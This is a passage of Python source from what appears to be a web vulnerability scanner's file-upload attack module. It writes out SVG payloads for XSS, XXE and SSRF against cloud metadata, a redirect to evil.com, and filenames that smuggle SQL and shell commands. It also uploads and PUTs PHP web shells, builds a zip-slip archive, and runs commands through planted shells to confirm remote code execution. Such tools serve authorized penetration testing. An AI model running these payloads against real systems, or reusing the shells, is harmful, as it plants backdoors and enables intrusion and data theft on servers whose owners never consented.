                        f"Exploit upload: {shell_fname} containing {shell_desc} (enabled by {cfg_name})"
                    )
                    
                    if shell_hit:
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(shell_hit)
                        self.scan_progress.emit(f"      ✅ EXPLOIT Chain: {shell_fname} uploaded after config")

            # ─────────────────────────────────────────────────────────────
            # TC-7: SVG PAYLOADS — XSS / XXE / SSRF / Open Redirect
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-7] SVG payloads (XSS / XXE / SSRF)...")
            results["stats"]["test_cases_run"] += 1

            # Resolve OAST domain for out-of-band XXE/SSRF verification
            _oast_domain = ""
            if self.oast_url:
                try:
                    raw_oast = self.oast_url.strip()
                    if "://" in raw_oast:
                        _oast_domain = urllib.parse.urlparse(raw_oast).netloc or urllib.parse.urlparse(raw_oast).path
                    else:
                        _oast_domain = raw_oast
                    _oast_domain = _oast_domain.split(":")[0].split("/")[0].strip()
                except Exception:
                    _oast_domain = self.oast_url

            SVG_PAYLOADS = [
                (
                    "svg_xss",
                    b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
                    "SVG XSS: onload alert"
                ),
                (
                    "svg_xss_script",
                    b'''<?xml version="1.0" standalone="no"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert("XSS")</script>
</svg>''',
                    "SVG XSS: script tag"
                ),
                (
                    "svg_xxe",
                    b'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',
                    "SVG XXE: file:///etc/hostname"
                ),
                (
                    "svg_ssrf",
                    b'''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image height="200" width="200"
         xlink:href="http://169.254.169.254/latest/meta-data/"/>
</svg>''',
                    "SVG SSRF: AWS metadata endpoint"
                ),
                (
                    "svg_redirect",
                    b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location=\'https://evil.com\'"
     xmlns="http://www.w3.org/2000/svg"/>''',
                    "SVG Open Redirect"
                ),
            ]

            # If OAST is configured, add out-of-band variants for XXE and SSRF
            if _oast_domain:
                self.scan_progress.emit(
                    f"  ℹ️  OAST domain configured — adding OOB XXE/SSRF SVG variants "
                    f"({_oast_domain})"
                )
                SVG_PAYLOADS.extend([
                    (
                        "svg_xxe_oob",
                        (
                            b'<?xml version="1.0" standalone="yes"?>\n'
                            b'<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://' +
                            _oast_domain.encode() +
                            b'/xxe">]>\n'
                            b'<svg xmlns="http://www.w3.org/2000/svg">'
                            b'<text>&xxe;</text></svg>'
                        ),
                        f"SVG XXE OOB: HTTP to {_oast_domain}"
                    ),
                    (
                        "svg_ssrf_oob",
                        (
                            b'<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
                            b'<svg xmlns="http://www.w3.org/2000/svg" '
                            b'xmlns:xlink="http://www.w3.org/1999/xlink">'
                            b'<image height="1" width="1" xlink:href="http://' +
                            _oast_domain.encode() +
                            b'/ssrf"/></svg>'
                        ),
                        f"SVG SSRF OOB: HTTP to {_oast_domain}"
                    ),
                ])
            for svg_name, svg_content, svg_desc in SVG_PAYLOADS:
                if not self.running: break
                
                # Generate specific filename for each vulnerability type
                suffix = svg_name.replace("svg_", "")
                filename = f"payload_{suffix}.svg"
                
                hit = _probe(
                    f"TC7-SVG-{svg_name}", filename,
                    svg_content, "image/svg+xml", svg_desc,
                    exec_param=None,
                    verify_content=svg_content
                )
                if hit:
                    results["vulnerable"] = True
                    results["stats"]["hits"] += 1
                    results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-8: FILENAME INJECTION — SQLi / CMDi / LFI / XSS
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-8] Filename injection (SQLi/CMDi/LFI/XSS)...")
            results["stats"]["test_cases_run"] += 1
            CLEAN_JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 16
            FILENAME_PAYLOADS = [
                # SQLi in filename
                ("fn_sqli_sleep",   "'sleep(10).jpg",         "Filename SQLi: sleep"),
                ("fn_sqli_comment", "sleep(10)-- -.jpg",      "Filename SQLi: comment"),
                ("fn_sqli_quote",   "' OR '1'='1.jpg",        "Filename SQLi: OR"),
                # CMDi in filename
                ("fn_cmdi_semi",    "; sleep 10;.jpg",        "Filename CMDi: semicolon"),
                ("fn_cmdi_pipe",    "| id |.jpg",             "Filename CMDi: pipe"),
                ("fn_cmdi_amp",     "& whoami &.jpg",         "Filename CMDi: ampersand"),
                ("fn_cmdi_dollar",  "$(id).jpg",              "Filename CMDi: dollar"),
                ("fn_cmdi_backtick","`id`.jpg",               "Filename CMDi: backtick"),
                # LFI in filename
                ("fn_lfi_passwd",   "../../etc/passwd/logo.png", "Filename LFI: path traversal"),
                ("fn_lfi_dotdot",   "../../../logo.png",      "Filename LFI: dotdot"),
                # XSS in filename
                ("fn_xss_svg",      "svg onload=alert(1)>.jpg", "Filename XSS: svg tag"),
                ("fn_xss_script",   "<script>alert(1)</script>.jpg", "Filename XSS: script"),
            ]
            for fn_id, fname, fn_desc in FILENAME_PAYLOADS:
                if not self.running: break
                hit = _probe(
                    f"TC8-Filename-{fn_id}", fname, CLEAN_JPEG,
                    "image/jpeg", fn_desc,
                    exec_param=None
                )
                if hit:
                    results["vulnerable"] = True
                    results["stats"]["hits"] += 1
                    results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-9: TINY SHELL — bypass content-length / size restrictions
            # ─────────────────────────────────────────────────────────────
            if "PHP" in self.target_langs:
                self.scan_progress.emit("\n[TC-9] Tiny shell payloads (PHP)...")
                results["stats"]["test_cases_run"] += 1
                TINY_SHELLS = [
                    (b"<?=`$_GET[x]`?>",          "php_backtick", "x"),
                    (b"<?='ls';",                  "php_short_ls", None),
                    (b"<?php passthru($_GET[c]);?>","php_passthru", "c"),
                    (b"GIF89a;<?=`$_GET[x]`?>",   "gif_magic_tiny", "x"),
                ]
                for tiny_content, tiny_id, tiny_param in TINY_SHELLS:
                    if not self.running: break
                    for ext in ("php", "phtml", "phar"):
                        hit = _probe(
                            f"TC9-TinyShell-{tiny_id}", f"t.{ext}",
                            tiny_content, "image/jpeg",
                            f"Tiny shell ({tiny_id}) accepted as .{ext}",
                            exec_param=tiny_param
                        )
                        if hit:
                            results["vulnerable"] = True
                            results["stats"]["hits"] += 1
                            results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-10: ZIP SLIP — path traversal inside archive filename
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-10] Zip slip archive upload...")
            results["stats"]["test_cases_run"] += 1
            zip_content = self._upload_build_zip_slip()
            if zip_content:
                hit = _probe(
                    "TC10-ZipSlip", "archive.zip",
                    zip_content, "application/zip",
                    "Zip slip: ../../../rce.php inside archive"
                )
                if hit:
                    results["vulnerable"] = True
                    results["stats"]["hits"] += 1
                    results["details"].append(hit)

            # ─────────────────────────────────────────────────────────────
            # TC-11: PUT METHOD UPLOAD
            # Some servers allow PUT on upload paths when POST upload exists,
            # or on static-file directories (e.g. PUT /images/shell.php).
            # We try several candidate paths derived from the upload URL.
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-11] PUT method upload...")
            results["stats"]["test_cases_run"] += 1

            parsed_url  = urllib.parse.urlparse(full_url)
            url_path    = parsed_url.path  # e.g. /my-account/avatar
            base_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"

            # Determine base path for PUT
            if url_path.endswith('/'):
                put_path_base = url_path + "shell.php"
            elif '.' in url_path.split('/')[-1]:
                # Has extension, strip filename
                put_path_base = url_path.rsplit('/', 1)[0] + "/shell.php"
            else:
                # No extension, treat as directory
                put_path_base = url_path + "/shell.php"
            
            if not put_path_base.startswith('/'):
                put_path_base = '/' + put_path_base

            # Candidate PUT paths — try the upload path itself, plus common
            # static-file directories that are likely to be world-writable.
            put_paths = [
                put_path_base,                          # Derived path
                "/images/shell.php",
                "/uploads/shell.php",
                "/files/shell.php",
                "/static/shell.php",
                "/assets/shell.php",
                "/media/shell.php",
                "/img/shell.php",
                "/upload/shell.php",
                "/data/shell.php",
            ]

            put_headers = dict(clean_headers)
            # content-type is set per-config inside the loop below

            for config in active_configs:
                ext = config["ext"]
                payload = config["payload"]
                config_ct = config["ct"]
                
                # Adjust put paths for extension
                current_put_paths = [p.replace(".php", f".{ext}") for p in put_paths]
                
                for put_path in current_put_paths:
                    if not self.running:
                        break
                    put_url = base_origin + put_path
                    results["stats"]["payloads_sent"] += 1

                    try:
                        _put_hdrs = dict(put_headers)
                        _put_hdrs["content-type"] = config_ct
                        resp = self.send_request_with_traffic(
                            put_url, _put_hdrs, method="PUT",
                            body=payload.decode("utf-8", errors="replace"),
                            payload=put_path,
                            payload_type="Upload-TC11-PUT",
                        )
                        sc   = getattr(resp, "status_code", 0) or 0
                        rlen = len(getattr(resp, "content", b""))
                        rtxt = getattr(resp, "text", "") or ""

                        # Success signals: 200/201/204 with no rejection keywords,
                        # or any 2xx response on a path we don't control normally
                        accepted = sc in (200, 201, 204) and not any(
                            kw in rtxt.lower()
                            for kw in ("not allowed", "method not allowed",
                                       "forbidden", "not found", "405", "403")
                        )
                        
                        rce_verified = False
                        verify_url_log = ""
                        
                        if accepted:
                            # Try to verify RCE at the PUT location
                            try:
                                verify_token = f"HUNT_RCE_{int(time.time())}"
                                command = f"echo '{verify_token}';"
                                exec_param = "cmd"
                                
                                sep = "&" if "?" in put_url else "?"
                                verify_url = f"{put_url}{sep}{exec_param}={urllib.parse.quote(command)}"
                                
                                self.scan_progress.emit(f"      🚀 Sending verification request: {verify_url}")
                                
                                # Prepare headers for verification
                                verify_headers = {k: v for k, v in clean_headers.items() 
                                                if k.lower() not in ('content-type', 'content-length')}
                                
                                verify_resp = self.send_request_with_traffic(
                                    verify_url, verify_headers, method="GET",
                                    payload=command,
                                    payload_type="Upload-Verify-TC11-PUT"
                                )
                                
                                if verify_resp and hasattr(verify_resp, 'text') and verify_token in verify_resp.text:
                                    rce_verified = True
                                    verify_url_log = verify_url
                            except Exception as e:
                                logger.debug(f"TC11 Verification failed: {e}")

                        # Log output
                        status_str = "✅ ACCEPTED" if accepted else f"HTTP {sc}"
                        rce_str = ""
                        if accepted:
                            if rce_verified:
                                rce_str = " | 🔥 RCE VERIFIED"
                            else:
                                rce_str = " | ❓ RCE Check Failed"

                        self.scan_progress.emit(
                            f"    [TC11-PUT] PUT {put_path:<45} "
                            f"HTTP {sc} | {rlen}b | {status_str}{rce_str}"
                        )
                        
                        if rce_verified:
                            msg = f"🔥 RCE VERIFIED: {verify_url_log}"
                            width = len(msg) + 4
                            self.scan_progress.emit(f"\n    ╔{'═'*width}╗")
                            self.scan_progress.emit(f"    ║  {msg}  ║")
                            self.scan_progress.emit(f"    ╚{'═'*width}╝\n")

                        if accepted:
                            url_found = self._upload_extract_url(rtxt, put_url)
                            description = f"PUT upload accepted: {put_path}"
                            if rce_verified:
                                description = f"🔥 RCE VERIFIED: {description}"
                                
                            hit = {
                                "test_case":        "TC11-PUT",
                                "description":      description,
                                "filename":         put_path,
                                "content_type":     config_ct,
                                "status_code":      sc,
                                "response_length":  rlen,
                                "file_url":         url_found or put_url,
                                "response_snippet": rtxt[:300],
                                "rce_verified":     rce_verified,
                                "verify_url":       verify_url_log,
                                "confidence":       "HIGH" if rce_verified else "MEDIUM",
                            }
                            results["vulnerable"] = True
                            results["stats"]["hits"] += 1
                            results["details"].append(hit)

                    except Exception as _e:
                        self.scan_progress.emit(
                            f"    [TC11-PUT] {put_path} — error: {_e}"
                        )

            # ─────────────────────────────────────────────────────────────
            # TC-12: PATH TRAVERSAL IN FILENAME
            # Strategy: find the first filename that the server ACCEPTED in
            # any prior TC (status 2xx, no rejection), then re-upload it
            # with path-traversal prefixes so the file lands in a parent
            # directory where PHP execution is not blocked.
            #
            # If no prior acceptance, use "shell.php" as the payload
            # (blacklist bypass is most common first success).
            #
            # Traversal variants (raw, URL-encoded, double-encoded):
            #   ../shell.php   ..%2fshell.php   ..%252fshell.php
            #   ....//shell.php   ..\shell.php  ..%5cshell.php
            # We try depth 1–3 to cover servers that strip one level of ../.
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[TC-12] Path traversal in filename...")
            results["stats"]["test_cases_run"] += 1

            # Pick the best accepted filename from prior TCs
            _accepted_payload = next(
                (d["filename"] for d in results["details"]
                 if d.get("status_code", 0) in (200, 201, 204, 302, 303)),
                "shell.php"          # fallback if nothing accepted yet
            )
            # Keep only the base name (no existing traversal prefix)
            # If we have a specific language selected, try to use that extension instead of the fallback
            if _accepted_payload == "shell.php" and "PHP" not in self.target_langs:
                if "ASP.NET" in self.target_langs:
                    _accepted_payload = "shell.aspx"
                elif "JSP" in self.target_langs:
                    _accepted_payload = "shell.jsp"
            
            _base_payload = _accepted_payload.split("/")[-1].split("\\")[-1]
            
            # Use payload matching the extension
            ext = _base_payload.split(".")[-1]
            payload_content = b"<?php system($_GET['cmd']); ?>" # Default
            for config in active_configs:
                if config["ext"] == ext:
                    payload_content = config["payload"]
                    break

            # Build traversal filename variants for depth 1, 2, 3
            _traversal_names: List[Tuple[str, str, int]] = []
            for depth in range(1, 4):
                dotdot     = "../" * depth
                dotdot_enc = "..%2f" * depth           # URL-encoded /
                dotdot_dbl = "..%252f" * depth          # double-encoded /
                dotdot_bs  = "..\\" * depth             # backslash
                dotdot_bs_enc = "..%5c" * depth         # URL-encoded backslash
                dotdot_ovr = "..../" * depth            # stripped-prefix bypass

                for prefix, label in [
                    (dotdot,        f"..x{depth}/"),
                    (dotdot_enc,    f"..%2fx{depth}"),
                    (dotdot_dbl,    f"..%252fx{depth}"),
                    (dotdot_bs,     f"..\\x{depth}"),
                    (dotdot_bs_enc, f"..%5cx{depth}"),
                    (dotdot_ovr,    f"....//x{depth}"),
                ]:
                    _traversal_names.append(
                        (f"{prefix}{_base_payload}", label, depth)
                    )

            for trav_name, trav_label, depth in _traversal_names:
                if not self.running:
                    break
                
                # Calculate resolved verification path based on depth
                verify_path = None
                if self.upload_base_url:
                    try:
                        base = self.upload_base_url if self.upload_base_url.endswith('/') else self.upload_base_url + '/'
                        parsed = urllib.parse.urlparse(base)
                        path_parts = [p for p in parsed.path.split('/') if p]
                        
                        # Go up 'depth' levels
                        if len(path_parts) >= depth:
                            new_path = '/' + '/'.join(path_parts[:-depth])
                        else:
                            new_path = '/'
                        
                        if not new_path.endswith('/'): new_path += '/'
                        verify_path = f"{parsed.scheme}://{parsed.netloc}{new_path}{_base_payload}"
                    except:
                        pass

                hit = _probe(
                    "TC12-PathTraversal",
                    trav_name,
                    payload_content,
                    active_configs[0]["ct"] if active_configs else "application/x-php",
                    f"Path traversal upload ({trav_label}): "
                    f"'{trav_name}' — shell may land in parent dir",
                    verify_path=verify_path
                )
                if hit:
                    results["vulnerable"] = True
                    results["stats"]["hits"] += 1
                    results["details"].append(hit)

        except Exception as e:
            logger.error(f"Upload scan error: {e}")
            results["error"] = str(e)

        # ── Summary ───────────────────────────────────────────────────────
        n = len(results["details"])
        if results["vulnerable"]:
            high  = sum(1 for d in results["details"] if d.get("confidence") == "HIGH")
            med   = sum(1 for d in results["details"] if d.get("confidence") == "MEDIUM")
            low   = sum(1 for d in results["details"] if d.get("confidence") == "LOW")
            rce   = sum(1 for d in results["details"] if d.get("rce_verified"))
            parts = []
            if rce:   parts.append(f"{rce} RCE verified")
            if high:  parts.append(f"{high} HIGH")
            if med:   parts.append(f"{med} MEDIUM")
            if low:   parts.append(f"{low} LOW (500)")
            results["summary"] = (
                f"File Upload VULNERABLE — {n} finding(s) "
                f"[{', '.join(parts)}] across "
                f"{results['stats']['test_cases_run']} test cases "
                f"({results['stats']['payloads_sent']} payloads sent)"
            )
        else:
            results["summary"] = (
                f"No file upload vulnerabilities detected "
                f"({results['stats']['payloads_sent']} payloads sent across "
                f"{results['stats']['test_cases_run']} test cases)"
            )

        self.scan_progress.emit(f"\n{'='*60}")
        self.scan_progress.emit(f"📋 UPLOAD SCAN COMPLETE: {results['summary']}")
        self.scan_progress.emit(f"{'='*60}")
        return results

    # ── Upload helpers ────────────────────────────────────────────────────────

    @staticmethod
    def _upload_build_files(field_name: str, filename: str,
                            content: bytes, content_type: str,
                            extra_fields: List[Tuple[str, str]]) -> dict:
        """
        Build the `files` dict for requests.post(files=...).
        Extra non-file fields are included as regular form fields.
        Format: {field: (filename, content, content_type)}
        Non-file fields: {field: (None, value)}
        """
        files = {}
        # Non-file form fields first (CSRF tokens, etc.)
        for fname_field, fval in extra_fields:
            files[fname_field] = (None, fval)
        # File field
        files[field_name] = (filename, content, content_type)
        return files

    @staticmethod
    def _upload_is_accepted(response) -> bool:
        """
        Heuristic: did the server accept the upload?

        Positive signals: 200/201/302 + no obvious rejection keywords.
        Rejection keywords: error, invalid, not allowed, rejected, failed,
                            unsupported, forbidden, denied, blocked.
        500 is also flagged — server crash on processing is interesting.
        """
        if not response or not hasattr(response, "status_code"):
            return False
        sc   = getattr(response, "status_code", 0) or 0
        text = (getattr(response, "text", "") or "").lower()

        REJECT_KEYWORDS = {
            "invalid file", "file type", "not allowed", "not permitted",
            "rejected", "upload failed", "unsupported", "forbidden",
            "extension not", "only allow", "must be", "invalid format",
            "file format", "invalid type", "blocked",
        }
        # 500 may indicate the server tried to process the file — still interesting
        if sc == 500:
            return True
        if sc not in (200, 201, 204, 302, 303):
            return False
        if any(kw in text for kw in REJECT_KEYWORDS):
            return False
        return True

    @staticmethod
    def _upload_extract_url(response_text: str, base_url: str) -> str:
        """
        Try to extract the URL where the uploaded file was stored from the
        response body.  Returns the URL string or empty string.
        """
        # JSON key patterns: "url", "path", "file", "link", "location", "src"
        for pat in (
            r'"(?:url|path|file|link|location|src|href)"\s*:\s*"([^"]+)"',
            r"'(?:url|path|file|link|location|src|href)'\s*:\s*'([^']+)'",
            r'href=["\']([^"\']+\.(php|phtml|phar|asp|aspx|jsp|svg))["\']',
            r'src=["\']([^"\']+\.(php|phtml|phar|asp|aspx|jsp|svg))["\']',
        ):
            m = re.search(pat, response_text, re.IGNORECASE)
            if m:
                found = m.group(1)
                # Unescape JSON slashes
                found = found.replace('\\/', '/')
                
                if found.startswith(('http://', 'https://')):
                    return found
                
                # Resolve relative URL
                return urllib.parse.urljoin(base_url, found)
        return ""

    @staticmethod
    def _upload_build_zip_slip() -> Optional[bytes]:
        """
        Build an in-memory ZIP containing a file with a path-traversal name
        (../../../rce.php) — the Zip Slip technique.
        Returns ZIP bytes or None if zipfile module unavailable.
        """
        import io
        try:
            import zipfile
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr(
                    "../../../rce.php",
                    "<?php system($_GET['cmd']); ?>"
                )
                zf.writestr(
                    "normal.jpg",
                    "\xff\xd8\xff\xe0" + "\x00" * 16
                )
            return buf.getvalue()
        except Exception:
            return None